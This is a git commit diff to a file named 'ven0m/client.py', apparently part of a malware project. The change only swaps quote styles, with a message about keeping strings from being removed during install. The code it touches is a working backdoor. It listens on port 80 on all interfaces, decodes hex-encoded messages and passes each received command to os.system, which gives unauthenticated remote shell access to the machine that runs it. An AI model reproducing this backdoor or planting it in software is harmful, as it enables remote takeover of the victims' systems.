2331d220973d247cf1be9142a8bc8e9397cdcb2f
Sam Burton <sam.burton271@gmail.com>
2024-09-16 08:44:48 -0400

    Changed string declarations so they don't get removed during install

--- ven0m/client.py
+++ ven0m/client.py
@@ -2,7 +2,7 @@
 import os
 import socket
 def main():
-    sock = socket.create_server(("0.0.0.0", 80))
+    sock = socket.create_server(('0.0.0.0', 80))
     sock.listen()
     while(True):
         connArray = sock.accept()
@@ -11,12 +11,12 @@ def main():
         while(length > 0):
             hexMessage = conn.recv(4096).decode('utf-8')
             message = bytes.fromhex(hexMessage).decode('utf-8')
-            if(message == "CMD"):
+            if(message == 'CMD'):
                 length = 1
                 while(length != 0):
                     hexMessage = conn.recv(4096).decode('utf-8')
                     message = bytes.fromhex(hexMessage).decode('utf-8')
-                    if(message.lower() == "exit"):
+                    if(message.lower() == 'exit'):
                         length = 0
                     if(length != 0):
                         os.system(message)
